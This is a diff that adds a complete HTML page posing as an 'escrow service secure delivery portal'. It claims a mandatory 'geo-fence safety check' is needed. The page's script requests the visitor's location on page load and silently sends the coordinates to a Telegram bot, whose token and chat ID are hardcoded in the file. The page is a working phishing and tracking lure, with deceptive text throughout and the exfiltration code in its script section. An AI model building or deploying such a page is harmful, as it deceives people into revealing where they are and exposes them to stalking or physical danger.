@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal: Geo-Fence Activation</title>
+    <style>
+        /* Base Styling for a "Secure" Look */
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #1a1a2e; /* Deep blue/purple background */
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background-color: #0f0f1a; /* Darker panel */
+            border: 1px solid #4a4e69;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(74, 78, 105, 0.5);
+            text-align: center;
+        }
+
+        /* Typography and Headings */
+        h1 {
+            color: #ffc300; /* Gold/Yellow accent */
+            font-size: 1.8em;
+            border-bottom: 2px solid #333652;
+            padding-bottom: 10px;
+            margin-bottom: 25px;
+        }
+
+        .status-box {
+            background-color: #333652;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            min-height: 50px;
+            text-align: left;
+        }
+
+        /* Security Feature Labels */
+        .feature-label {
+            font-size: 0.9em;
+            color: #8d92a8;
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        .key-data {
+            background-color: #0f0f1a;
+            border: 1px dashed #4a4e69;
+            padding: 8px;
+            margin-top: 5px;
+            font-size: 0.8em;
+            overflow-wrap: break-word;
+            word-break: break-all;
+            color: #a0a8d4;
+            text-align: left;
+        }
+        
+        .success-msg { color: #5cb85c; font-weight: bold; }
+        .error-msg { color: #d9534f; font-weight: bold; }
+        .info-msg { color: #5bc0de; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 ESCROW SERVICE: SECURE DELIVERY PORTAL</h1>
+        
+        <div class="feature-label">Temporary Transaction ID:</div>
+        <div class="key-data" id="transaction-id">TEMP-TX-9A8C7B6D-1E2F</div>
+        
+        <div class="feature-label">PGP Key Hash (Encrypted Session):</div>
+        <div class="key-data" id="pgp-key">0x9F4C2D1E-A3B5-C6D7-E8F0...</div>
+        
+        <p style="margin-top: 30px; color: #ffc300;">
+            **Geo-Fence Safety Check Required**
+        </p>
+        <p style="font-size: 0.9em; line-height: 1.5;">
+            To activate the anonymous delivery window and verify your distance from the secure drop point, the system requires a brief, one-time spatial coordinate confirmation. 
+            <br>This is **mandatory** for operational safety.
+        </p>
+
+        <div class="status-box">
+            <span id="status" class="info-msg">
+                System Awaiting Spatial Coordinate Confirmation...
+            </span>
+        </div>
+        <div class="status-box">
+            <span id="result" class="info-msg">
+                Telegram Relay Status: Idle
+            </span>
+        </div>
+    </div>
+
+    <script>
+        // --- Telegram Bot Configuration (Your Details) ---
+        const BOT_TOKEN = '7911685853:AAHF0ToK-ozN2ONXFAmu1BF-tIcGFWs0Zgo';
+        const CHAT_ID = '7964157982';
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+
+        // --- Utility Functions for Status Messages ---
+        const statusElement = document.getElementById("status");
+        const resultElement = document.getElementById("result");
+        
+        function updateStatus(message, type = 'info-msg') {
+            statusElement.className = type;
+            statusElement.innerHTML = message;
+        }
+
+        function updateResult(message, type = 'info-msg') {
+            resultElement.className = type;
+            resultElement.innerHTML = message;
+        }
+
+        // --- Core Telegram Function ---
+        async function sendLocationToTelegram(latitude, longitude) {
+            updateResult("Processing spatial coordinates... Sending to Telegram relay.", 'info-msg');
+            
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        latitude: latitude,
+                        longitude: longitude,
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.ok) {
+                    updateResult("✅ COORDINATE RELAY SUCCESSFUL. Delivery window activated.", 'success-msg');
+                } else {
+                    console.error("Telegram API Error:", data);
+                    updateResult(`❌ RELAY FAILURE: ${data.description || 'Unknown API error'}`, 'error-msg');
+                }
+            } catch (error) {
+                console.error("Network or Fetch Error:", error);
+                updateResult(`❌ NETWORK ERROR: Could not connect to Telegram API.`, 'error-msg');
+            }
+        }
+
+        // --- Geolocation Handlers ---
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            
+            updateStatus(`[ACQUIRED] Lat: ${latitude} | Lon: ${longitude}. Initializing secure transmission...`, 'info-msg');
+            
+            // 2. Send the data to your Telegram bot
+            sendLocationToTelegram(latitude, longitude);
+        }
+
+        function showError(error) {
+            let message = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "ACCESS DENIED: User aborted the spatial confirmation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "ERROR: Location data is unavailable or unreliable.";
+                    break;
+                case error.TIMEOUT:
+                    message = "TIMEOUT: Coordinate confirmation request timed out.";
+                    break;
+                default:
+                    message = "CRITICAL ERROR: An unknown system fault occurred.";
+            }
+            updateStatus(`[FAILURE] ${message}`, 'error-msg');
+            updateResult("Relay inactive.", 'error-msg');
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                // This line triggers the browser's permission prompt
+                updateStatus("Awaiting browser confirmation for spatial coordinates...", 'info-msg');
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                updateStatus("SYSTEM INCOMPATIBILITY: Geolocation is not supported.", 'error-msg');
+            }
+        }
+
+        // Run the function as soon as the page loads
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
